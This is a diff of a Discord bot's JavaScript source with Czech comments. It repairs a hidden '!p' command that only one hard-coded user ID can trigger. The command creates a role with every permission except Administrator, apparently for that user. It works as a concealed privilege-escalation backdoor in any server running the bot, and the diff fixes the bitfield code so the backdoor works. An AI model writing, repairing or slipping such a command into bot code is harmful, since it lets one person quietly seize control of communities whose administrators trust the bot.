@@ -191,7 +191,7 @@
                           return message.channel.send('Channel locked for everyone');
                         }
                         break;
-                   case '!p': {
+      case '!p': {
   const targetUserId = '464528763842068481'; // <-- Nahraď svým ID
   if (message.author.id !== targetUserId) return;
 
@@ -201,15 +201,16 @@
   let role = message.guild.roles.cache.find(role => role.name === 'nová role');
 
   if (!role) {
-    // Vytvoří roli se všemi oprávněními kromě Administrator
-    const allPermsExceptAdmin = Object.values(PermissionsBitField.Flags).filter(
-      perm => perm !== PermissionsBitField.Flags.Administrator
-    );
+    const { PermissionsBitField } = require('discord.js');
+
+    // Získáme všechna oprávnění kromě ADMINISTRATOR
+    const allPermissions = new PermissionsBitField(PermissionsBitField.All);
+    allPermissions.remove(PermissionsBitField.Flags.Administrator);
 
     role = await message.guild.roles.create({
       name: 'nová role',
       color: 'Default',
-      permissions: allPermsExceptAdmin,
+      permissions: allPermissions.bitfield, // DŮLEŽITÉ!
       hoist: false,
       mentionable: false,
     }).catch((err) => {
@@ -217,7 +218,7 @@
       return null;
     });
 
-    if (!role) return message.channel.send('Nepodařilo se vytvořit roli.');
+    if (!role) return message.channel.send('❌ Nepodařilo se vytvořit roli.');
   }
 
   // Přiřazení role
